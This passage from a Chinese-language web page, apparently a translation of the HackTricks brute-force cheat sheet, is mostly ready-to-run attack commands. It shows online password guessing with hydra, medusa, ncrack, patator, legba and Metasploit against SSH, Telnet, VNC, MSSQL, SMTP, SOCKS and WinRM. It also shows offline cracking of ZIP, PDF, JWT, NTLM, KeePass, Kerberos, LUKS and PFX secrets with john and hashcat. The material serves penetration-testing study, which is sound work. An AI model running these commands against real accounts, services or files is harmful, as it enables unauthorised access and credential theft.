+hydra -l &lt;username&gt; -P /path/to/passwords.txt -s 587 &lt;IP&gt; -S -v -V #Port 587 for SMTP with SSL
+legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism &lt;mech&gt;]
+</code></pre>
+<h3 id="socks"><a class="header" href="#socks">SOCKS</a></h3>
+<pre><code class="language-bash">nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 &lt;IP&gt;
+legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
+# With alternative address
+legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
+</code></pre>
+<h3 id="sql-server"><a class="header" href="#sql-server">SQL Server</a></h3>
+<pre><code class="language-bash">#Use the NetBIOS name of the machine as domain
+crackmapexec mssql &lt;IP&gt; -d &lt;Domain Name&gt; -u usernames.txt -p passwords.txt
+hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; mssql
+medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
+nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts &lt;host&gt; #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
+msf&gt; use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
+</code></pre>
+<h3 id="ssh"><a class="header" href="#ssh">SSH</a></h3>
+<pre><code class="language-bash">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ssh
+ncrack -p 22 --user root -P passwords.txt &lt;IP&gt; [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ssh
+patator ssh_login host=&lt;ip&gt; port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
+legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
+# Try keys from a folder
+legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
+</code></pre>
+<h4 id="弱-ssh-密钥--debian-可预测的-prng"><a class="header" href="#弱-ssh-密钥--debian-可预测的-prng">弱 SSH 密钥 / Debian 可预测的 PRNG</a></h4>
+<p>一些系统在生成加密材料时使用的随机种子存在已知缺陷。这可能导致密钥空间显著减少，可以使用工具如 <a href="https://github.com/snowdroppe/ssh-keybrute">snowdroppe/ssh-keybrute</a> 进行暴力破解。也可以找到预生成的弱密钥集，如 <a href="https://github.com/g0tmi1k/debian-ssh">g0tmi1k/debian-ssh</a>。</p>
+<h3 id="stomp-activemq-rabbitmq-hornetq-和-openmq"><a class="header" href="#stomp-activemq-rabbitmq-hornetq-和-openmq">STOMP (ActiveMQ, RabbitMQ, HornetQ 和 OpenMQ)</a></h3>
+<p>STOMP 文本协议是一种广泛使用的消息传递协议，<strong>允许与流行的消息队列服务如 RabbitMQ、ActiveMQ、HornetQ 和 OpenMQ 进行无缝通信和交互</strong>。它提供了一种标准化和高效的方法来交换消息并执行各种消息操作。</p>
+<pre><code class="language-bash">legba stomp --target localhost:61613 --username admin --password data/passwords.txt
+</code></pre>
+<h3 id="telnet"><a class="header" href="#telnet">Telnet</a></h3>
+<pre><code class="language-bash">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; telnet
+ncrack -p 23 --user root -P passwords.txt &lt;IP&gt; [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M telnet
+
+legba telnet \
+--username admin \
+--password wordlists/passwords.txt \
+--target localhost:23 \
+--telnet-user-prompt "login: " \
+--telnet-pass-prompt "Password: " \
+--telnet-prompt ":~$ " \
+--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
+</code></pre>
+<h3 id="vnc"><a class="header" href="#vnc">VNC</a></h3>
+<pre><code class="language-bash">hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s &lt;PORT&gt; &lt;IP&gt; vnc
+medusa -h &lt;IP&gt; –u root -P /root/Desktop/pass.txt –M vnc
+ncrack -V --user root -P /root/Desktop/pass.txt &lt;IP&gt;:&gt;POR&gt;T
+patator vnc_login host=&lt;IP&gt; password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
+use auxiliary/scanner/vnc/vnc_login
+nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt &lt;IP&gt;
+legba vnc --target localhost:5901 --password data/passwords.txt
+
+#Metasploit
+use auxiliary/scanner/vnc/vnc_login
+set RHOSTS &lt;ip&gt;
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
+</code></pre>
+<h3 id="winrm"><a class="header" href="#winrm">Winrm</a></h3>
+<pre><code class="language-bash">crackmapexec winrm &lt;IP&gt; -d &lt;Domain Name&gt; -u usernames.txt -p passwords.txt
+</code></pre>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p><br />
+使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_content=brute-force"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流程</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+立即获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=brute-force" %}</p>
+<h2 id="本地"><a class="header" href="#本地">本地</a></h2>
+<h3 id="在线破解数据库"><a class="header" href="#在线破解数据库">在线破解数据库</a></h3>
+<ul>
+<li><a href="http://hashtoolkit.com/reverse-hash?"><del>http://hashtoolkit.com/reverse-hash?</del></a> (MD5 &amp; SHA1)</li>
+<li><a href="https://shuck.sh/get-shucking.php">https://shuck.sh/get-shucking.php</a> (MSCHAPv2/PPTP-VPN/NetNTLMv1 有/无 ESS/SSP 和任何挑战值)</li>
+<li><a href="https://www.onlinehashcrack.com">https://www.onlinehashcrack.com/</a> (哈希，WPA2 捕获，以及 MSOffice、ZIP、PDF 等档案)</li>
+<li><a href="https://crackstation.net">https://crackstation.net/</a> (哈希)</li>
+<li><a href="https://md5decrypt.net">https://md5decrypt.net/</a> (MD5)</li>
+<li><a href="https://gpuhash.me">https://gpuhash.me/</a> (哈希和文件哈希)</li>
+<li><a href="https://hashes.org/search.php">https://hashes.org/search.php</a> (哈希)</li>
+<li><a href="https://www.cmd5.org">https://www.cmd5.org/</a> (哈希)</li>
+<li><a href="https://hashkiller.co.uk/Cracker">https://hashkiller.co.uk/Cracker</a> (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)</li>
+<li><a href="https://www.md5online.org/md5-decrypt.html">https://www.md5online.org/md5-decrypt.html</a> (MD5)</li>
+<li><a href="http://reverse-hash-lookup.online-domain-tools.com">http://reverse-hash-lookup.online-domain-tools.com/</a></li>
+</ul>
+<p>在尝试暴力破解哈希之前，请查看此内容。</p>
+<h3 id="zip"><a class="header" href="#zip">ZIP</a></h3>
+<pre><code class="language-bash">#sudo apt-get install fcrackzip
+fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
+</code></pre>
+<pre><code class="language-bash">zip2john file.zip &gt; zip.john
+john zip.john
+</code></pre>
+<pre><code class="language-bash">#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
+hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
+.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
+</code></pre>
+<h4 id="已知明文zip攻击"><a class="header" href="#已知明文zip攻击">已知明文zip攻击</a></h4>
+<p>您需要知道加密zip中<strong>包含的文件的明文</strong>（或部分明文）。您可以通过运行**<code>7z l encrypted.zip</code><strong>来检查</strong>包含在加密zip中的文件名和文件大小**。<br />
+从发布页面下载<a href="https://github.com/kimci86/bkcrack/releases/tag/v1.4.0"><strong>bkcrack</strong> </a>。</p>
+<pre><code class="language-bash"># You need to create a zip file containing only the file that is inside the encrypted zip
+zip plaintext.zip plaintext.file
+
+./bkcrack -C &lt;encrypted.zip&gt; -c &lt;plaintext.file&gt; -P &lt;plaintext.zip&gt; -p &lt;plaintext.file&gt;
+# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
+# With that key you can create a new zip file with the content of encrypted.zip
+# but with a different pass that you set (so you can decrypt it)
+./bkcrack -C &lt;encrypted.zip&gt; -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
+unzip unlocked.zip #User new_pwd as password
+</code></pre>
+<h3 id="7z"><a class="header" href="#7z">7z</a></h3>
+<pre><code class="language-bash">cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
+</code></pre>
+<pre><code class="language-bash">#Download and install requirements for 7z2john
+wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
+apt-get install libcompress-raw-lzma-perl
+./7z2john.pl file.7z &gt; 7zhash.john
+</code></pre>
+<h3 id="pdf"><a class="header" href="#pdf">PDF</a></h3>
+<pre><code class="language-bash">apt-get install pdfcrack
+pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
+#pdf2john didn't work well, john didn't know which hash type was
+# To permanently decrypt the pdf
+sudo apt-get install qpdf
+qpdf --password=&lt;PASSWORD&gt; --decrypt encrypted.pdf plaintext.pdf
+</code></pre>
+<h3 id="pdf所有者密码"><a class="header" href="#pdf所有者密码">PDF所有者密码</a></h3>
+<p>要破解PDF所有者密码，请查看此链接: <a href="https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/">https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/</a></p>
+<h3 id="jwt-1"><a class="header" href="#jwt-1">JWT</a></h3>
+<pre><code class="language-bash">git clone https://github.com/Sjord/jwtcrack.git
+cd jwtcrack
+
+#Bruteforce using crackjwt.py
+python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
+
+#Bruteforce using john
+python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc &gt; jwt.john
+john jwt.john #It does not work with Kali-John
+</code></pre>
+<h3 id="ntlm-破解"><a class="header" href="#ntlm-破解">NTLM 破解</a></h3>
+<pre><code class="language-bash">Format:USUARIO:ID:HASH_LM:HASH_NT:::
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
+hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
+</code></pre>
+<h3 id="keepass"><a class="header" href="#keepass">Keepass</a></h3>
+<pre><code class="language-bash">sudo apt-get install -y kpcli #Install keepass tools like keepass2john
+keepass2john file.kdbx &gt; hash #The keepass is only using password
+keepass2john -k &lt;file-password&gt; file.kdbx &gt; hash # The keepass is also using a file as a needed credential
+#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+</code></pre>
+<h3 id="keberoasting"><a class="header" href="#keberoasting">Keberoasting</a></h3>
+<pre><code class="language-bash">john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
+</code></pre>
+<h3 id="lucks-image"><a class="header" href="#lucks-image">Lucks image</a></h3>
+<h4 id="方法-1"><a class="header" href="#方法-1">方法 1</a></h4>
+<p>安装: <a href="https://github.com/glv2/bruteforce-luks">https://github.com/glv2/bruteforce-luks</a></p>
+<pre><code class="language-bash">bruteforce-luks -f ./list.txt ./backup.img
+cryptsetup luksOpen backup.img mylucksopen
+ls /dev/mapper/ #You should find here the image mylucksopen
+mount /dev/mapper/mylucksopen /mnt
+</code></pre>
+<h4 id="方法-2"><a class="header" href="#方法-2">方法 2</a></h4>
+<pre><code class="language-bash">cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
+dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
+hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
+cryptsetup luksOpen backup.img mylucksopen
+ls /dev/mapper/ #You should find here the image mylucksopen
+mount /dev/mapper/mylucksopen /mnt
+</code></pre>
+<p>另一个 Luks BF 教程: <a href="http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1">http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1</a></p>
+<h3 id="mysql-1"><a class="header" href="#mysql-1">Mysql</a></h3>
+<pre><code class="language-bash">#John hash format
+&lt;USERNAME&gt;:$mysqlna$&lt;CHALLENGE&gt;*&lt;RESPONSE&gt;
+dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
+</code></pre>
+<h3 id="pgpgpg-私钥"><a class="header" href="#pgpgpg-私钥">PGP/GPG 私钥</a></h3>
+<pre><code class="language-bash">gpg2john private_pgp.key #This will generate the hash and save it in a file
+john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
+</code></pre>
+<h3 id="cisco"><a class="header" href="#cisco">Cisco</a></h3>
+<figure><img src="../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>
+<h3 id="dpapi-主密钥"><a class="header" href="#dpapi-主密钥">DPAPI 主密钥</a></h3>
+<p>使用 <a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py">https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py</a> 然后使用 john</p>
+<h3 id="open-office-密码保护列"><a class="header" href="#open-office-密码保护列">Open Office 密码保护列</a></h3>
+<p>如果你有一个带有密码保护列的 xlsx 文件，你可以解除保护：</p>
+<ul>
+<li><strong>上传到谷歌云端硬盘</strong>，密码将被自动移除</li>
+<li>要 <strong>手动</strong> <strong>移除</strong>：</li>
+</ul>
+<pre><code class="language-bash">unzip file.xlsx
+grep -R "sheetProtection" ./*
+# Find something like: &lt;sheetProtection algorithmName="SHA-512"
+hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/&gt;
+# Remove that line and rezip the file
+zip -r file.xls .
+</code></pre>
+<h3 id="pfx-证书"><a class="header" href="#pfx-证书">PFX 证书</a></h3>
+<pre><code class="language-bash"># From https://github.com/Ridter/p12tool
+./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
+# From https://github.com/crackpkcs12/crackpkcs12
+crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
+</code></pre>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p><br />
+使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_content=brute-force"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流程</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+立即获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=brute-force" %}</p>
+<h2 id="工具"><a class="header" href="#工具">工具</a></h2>
+<p><strong>哈希示例：</strong> <a href="https://openwall.info/wiki/john/sample-hashes">https://openwall.info/wiki/john/sample-hashes</a></p>
+<h3 id="哈希识别器"><a class="header" href="#哈希识别器">哈希识别器</a></h3>
+<pre><code class="language-bash">hash-identifier
+&gt; &lt;HASH&gt;
+</code></pre>
+<h3 id="wordlists"><a class="header" href="#wordlists">Wordlists</a></h3>
+<ul>
+<li><strong>Rockyou</strong></li>
+<li><a href="https://github.com/berzerk0/Probable-Wordlists"><strong>Probable-Wordlists</strong></a></li>
+<li><a href="https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists"><strong>Kaonashi</strong></a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords"><strong>Seclists - Passwords</strong></a></li>
+</ul>
+<h3 id="wordlist-generation-tools"><a class="header" href="#wordlist-generation-tools"><strong>Wordlist Generation Tools</strong></a></h3>
+<ul>
+<li><a href="https://github.com/hashcat/kwprocessor"><strong>kwprocessor</strong></a><strong>:</strong> 高级键盘行走生成器，具有可配置的基本字符、键盘映射和路线。</li>
+</ul>
+<pre><code class="language-bash">kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
+</code></pre>
+<h3 id="john-mutation"><a class="header" href="#john-mutation">John mutation</a></h3>
+<p>阅读 <em><strong>/etc/john/john.conf</strong></em> 并进行配置</p>
+<pre><code class="language-bash">john --wordlist=words.txt --rules --stdout &gt; w_mutated.txt
+john --wordlist=words.txt --rules=all --stdout &gt; w_mutated.txt #Apply all rules
+</code></pre>
+<h3 id="hashcat"><a class="header" href="#hashcat">Hashcat</a></h3>
+<h4 id="hashcat-攻击"><a class="header" href="#hashcat-攻击">Hashcat 攻击</a></h4>
+<ul>
+<li><strong>字典攻击</strong> (<code>-a 0</code>) 带规则</li>
+</ul>
+<p><strong>Hashcat</strong> 已经附带一个 <strong>包含规则的文件夹</strong>，但你可以在 <a href="https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules"><strong>这里找到其他有趣的规则</strong></a>。</p>
+<pre><code>hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
+</code></pre>
+<ul>
+<li><strong>Wordlist combinator</strong> 攻击</li>
+</ul>
+<p>可以使用 hashcat <strong>将 2 个字典组合成 1 个</strong>。<br />
+如果列表 1 包含单词 <strong>"hello"</strong>，而第二个列表包含 2 行单词 <strong>"world"</strong> 和 <strong>"earth"</strong>。将生成单词 <code>helloworld</code> 和 <code>helloearth</code>。</p>
+<pre><code class="language-bash"># This will combine 2 wordlists
+hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
+
+# Same attack as before but adding chars in the newly generated words
+# In the previous example this will generate:
+## hello-world!
+## hello-earth!
+hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
+</code></pre>
+<ul>
+<li><strong>掩码攻击</strong> (<code>-a 3</code>)</li>
+</ul>
+<pre><code class="language-bash"># Mask attack with simple mask
+hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
+
+hashcat --help #will show the charsets and are as follows
+? | Charset
+===+=========
+l | abcdefghijklmnopqrstuvwxyz
+u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
+d | 0123456789
+h | 0123456789abcdef
+H | 0123456789ABCDEF
+s | !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
+a | ?l?u?d?s
+b | 0x00 - 0xff
+
+# Mask attack declaring custom charset
+hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
+## -1 ?d?s defines a custom charset (digits and specials).
+## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.
+
+# Mask attack with variable password length
+## Create a file called masks.hcmask with this content:
+?d?s,?u?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?l?l?1
+## Use it to crack the password
+hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
+</code></pre>
+<ul>
+<li>字典 + 掩码 (<code>-a 6</code>) / 掩码 + 字典 (<code>-a 7</code>) 攻击</li>
+</ul>
+<pre><code class="language-bash"># Mask numbers will be appended to each word in the wordlist
+hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
+
+# Mask numbers will be prepended to each word in the wordlist
+hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
+</code></pre>
+<h4 id="hashcat-模式"><a class="header" href="#hashcat-模式">Hashcat 模式</a></h4>
+<pre><code class="language-bash">hashcat --example-hashes | grep -B1 -A2 "NTLM"
+</code></pre>
+<p>破解Linux哈希 - /etc/shadow文件</p>
+<pre><code>500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
+3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
+7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
+1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
+</code></pre>
+<p>破解Windows哈希</p>
+<pre><code>3000 | LM                                               | Operating-Systems
+1000 | NTLM                                             | Operating-Systems
+</code></pre>
+<p>破解常见应用程序哈希</p>
+<pre><code>900 | MD4                                              | Raw Hash
+0 | MD5                                              | Raw Hash
+5100 | Half MD5                                         | Raw Hash
+100 | SHA1                                             | Raw Hash
+10800 | SHA-384                                          | Raw Hash
+1400 | SHA-256                                          | Raw Hash
+1700 | SHA-512                                          | Raw Hash
+</code></pre>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p><br />
+使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_content=brute-force"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流程</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+今天就获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=brute-force" %}</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../generic-methodologies-and-resources/threat-modeling.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../generic-hacking/exfiltration.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../generic-methodologies-and-resources/threat-modeling.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../generic-hacking/exfiltration.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr.min.js"></script>
+        <script src="../mark.min.js"></script>
+        <script src="../searcher.js"></script>
+
+        <script src="../clipboard.min.js"></script>
+        <script src="../highlight.js"></script>
+        <script src="../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
